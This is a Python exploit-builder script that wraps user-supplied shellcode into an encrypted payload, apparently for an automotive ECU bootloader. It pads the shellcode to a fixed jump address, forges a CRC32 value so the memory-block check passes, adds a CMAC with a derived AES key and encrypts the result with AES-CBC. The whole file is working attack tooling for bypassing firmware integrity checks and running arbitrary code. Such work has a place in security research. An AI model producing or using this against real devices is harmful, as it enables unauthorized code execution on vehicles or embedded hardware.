#!/usr/bin/env python3

# Build payload from shelcode. Example:
# ./build_payload.py -s "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" shellcode/main.bin

import argparse
import binascii
import struct

from Crypto.Cipher import AES
from Crypto.Hash import CMAC

LENGTH = 0xfe0
JMP_LOCATION = 0xfd0

def cmac(to_auth, key):
    cobj = CMAC.new(key, ciphermod=AES)
    cobj.update(to_auth)
    return cobj.digest()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('shellcode', help='Path to shellcode')
    parser.add_argument('-s', '--secret', help='Secret to derive encryption key')
    parser.add_argument('-k', '--key', help='Encryption key (DID 0x201)', default="00" * 16)
    parser.add_argument('-i', '--iv', help='Encryption IV (DID 0x202)', default="00" * 16)

    args = parser.parse_args()

    secret = bytes.fromhex(args.secret)
    key = bytes.fromhex(args.key)
    iv = bytes.fromhex(args.iv)

    with open(args.shellcode, 'rb') as f:
        payload = f.read()

    # Pad out to jmp addr
    padding = JMP_LOCATION - len(payload)
    assert padding >= 0
    payload += b'\x00' * padding

    # Add jmp addr
    payload += struct.pack("<I", 0xfebf0000)

    # Add padding
    padding = LENGTH - len(payload)
    payload += b'\x00' * padding

    # Add CRC check values
    payload += struct.pack("<I", 0xfebf0000) # Addr check by `check_mem_block_crc`
    payload += struct.pack("<I", 0xff0)      # Size check by `check_mem_block_crc`
    payload += b"\x00" * 4 # Padding

    # Compute padding value that makes CRC32 == 0xffffffff
    crc = binascii.crc32(payload)
    payload += struct.pack("<I", crc ^ 0xffff_ffff)
    assert binascii.crc32(payload[:0xff0]) == 0xffff_ffff

    # Compute derived key used for CMAC and payload encryption
    derived_key = AES.new(secret, AES.MODE_ECB).encrypt(key)

    # Compute CMAC
    payload += cmac(iv + payload, key=derived_key) # NB: IV is prepended to payload in `bl_routine_control_cmac_first_block_DID_0x202`

    # Encrypt payload
    cipher = AES.new(derived_key, AES.MODE_CBC, iv=iv)
    payload = cipher.encrypt(payload)

    with open('payload.bin', 'wb') as f:
        f.write(payload)
